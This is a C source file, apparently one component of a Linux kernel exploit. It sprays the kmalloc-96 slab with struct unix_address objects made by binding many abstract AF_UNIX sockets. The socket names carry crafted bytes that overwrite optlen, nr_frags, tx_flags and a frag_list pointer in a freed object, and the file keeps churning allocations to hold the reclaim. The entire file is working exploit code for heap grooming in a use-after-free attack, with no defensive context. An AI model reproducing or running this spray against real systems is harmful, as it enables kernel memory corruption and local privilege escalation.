/* unixspray.c <cpu> <S> [nsocks]
 *
 * Third reclaim bucket: struct unix_address (kmalloc-96).
 * unix_create_addr() does kmalloc(8 + len); len = 88 -> 96 bytes.
 * Layout: refcnt 0..3, len 4..7, name 8..95 (sockaddr_un: family 8..9,
 * sun_path 10..95).  So:
 *   object+24 = sun_path[14]  -> optlen (we set 160)
 *   object+82/83 = sun_path[72/73] -> nr_frags/tx_flags (0)
 *   object+88..95 = sun_path[78..85] -> frag_list = S
 * Allocation call site: unix_create_addr+0x29 (a distinct random-cache
 * bucket from saved_syn / user_key_payload).
 *
 * Abstract AF_UNIX names (sun_path[0] == 0) give a persistent, quota-free
 * spray; the id lives in sun_path[1..4], away from the payload bytes.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <cpu> <S> [nsocks]\n", argv[0]);
        return 1;
    }
    int cpu = atoi(argv[1]);
    unsigned long long S = strtoull(argv[2], NULL, 0);
    int n = argc > 3 ? atoi(argv[3]) : 512;
    if (n > 60000) n = 60000;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);

    struct sockaddr_un sa;
    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    unsigned char *p = (unsigned char *)sa.sun_path;
    p[0] = 0;                       /* abstract namespace */
    p[14] = 160;                    /* object+24 = optlen */
    p[72] = 0;                      /* object+82 = nr_frags */
    p[73] = 0;                      /* object+83 = tx_flags */
    memcpy(p + 78, &S, 8);          /* object+88..95 = frag_list */
    const socklen_t alen = 2 + 86;  /* family + sun_path[0..85] = 88 */

    int *fds = calloc(n, sizeof(int));
    if (!fds) return 1;
    uint32_t id = (uint32_t)getpid() * 2654435761u;
    int made = 0;
    for (int i = 0; i < n; i++) {
        int fd = socket(AF_UNIX, SOCK_STREAM, 0);
        if (fd < 0) { perror("socket"); break; }
        id++;
        memcpy(p + 1, &id, 4);
        if (bind(fd, (struct sockaddr *)&sa, alen) < 0) {
            perror("bind");
            close(fd);
            break;
        }
        fds[made++] = fd;
    }
    fprintf(stderr, "unixspray cpu=%d S=%#llx made=%d alen=%u\n", cpu, S, made, alen);
    if (!made) return 1;

    int idx = 0;
    unsigned long it = 0;
    for (;;) {
        int fd = socket(AF_UNIX, SOCK_STREAM, 0);
        if (fd >= 0) {
            id++;
            memcpy(p + 1, &id, 4);
            if (bind(fd, (struct sockaddr *)&sa, alen) == 0) {
                close(fds[idx]);
                fds[idx] = fd;
                idx = (idx + 1) % made;
            } else {
                close(fd);
            }
        }
        it++;
        if ((it & 0x3ff) == 0) fprintf(stderr, "churn=%lu\n", it);
    }
}
